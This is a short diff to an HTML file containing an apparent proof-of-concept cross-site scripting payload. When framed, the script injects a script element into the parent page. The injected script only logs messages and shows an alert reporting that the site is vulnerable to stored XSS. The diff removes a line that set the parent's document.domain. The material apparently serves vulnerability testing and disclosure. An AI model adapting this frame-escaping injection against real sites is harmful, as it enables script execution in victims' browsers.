@@ -9,13 +9,13 @@
 <body>
     <script>
 
-        function delivery() {
-            parent.document.domain = "master--dainty-dusk-3f3151.netlify.app";
+        function delivery(a) {
+            console.log(a)
             var payload = parent.document.createElement('script');
             payload.textContent = "console.log('payload.js loaded');\nconsole.log('running in native context');\nalert('This site was found to be vulnerable to a stored cross-site scripting attack. Please notify system administrators immediately.');";
             parent.document.body.appendChild(payload);
         }
 
-        this.top.location !== this.location && (delivery());
+        this.top.location !== this.location && (delivery(this));
     </script>
 </html>
